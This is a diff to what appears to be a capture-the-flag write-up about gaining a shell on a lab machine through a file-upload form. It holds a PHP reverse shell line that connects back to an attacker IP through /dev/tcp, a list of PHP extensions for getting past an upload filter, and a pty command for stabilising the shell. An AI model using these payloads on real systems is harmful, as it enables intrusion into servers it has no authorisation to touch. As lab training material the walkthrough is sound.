@@ -81,6 +81,18 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.137.69/9999 0>&1'");
 
 ## ohh so it refuse to upload php files let's find which extension website accept 
 
+```http
+php
+php3
+php4
+php5
+php7
+phtml
+pht
+phar
+phps
+php8
+```
 
 <img width="1572" height="593" alt="image" src="https://github.com/user-attachments/assets/bdd1f8ff-3b35-40d5-bdb9-50ec36dc2bc5" />
 
@@ -91,7 +103,14 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.137.69/9999 0>&1'");
 
 ## when open **`shell.php5`** it open shell 
 
+
 <img width="1560" height="477" alt="image" src="https://github.com/user-attachments/assets/59f8fa93-e145-447d-9b8e-e21bf38eb2ca" />
+
+## make it stable shell 
+
+```
+python3 -c 'import pty,os; pty.spawn("/bin/bash")'
+```
 
 ## now search for **`user.txt`**
 
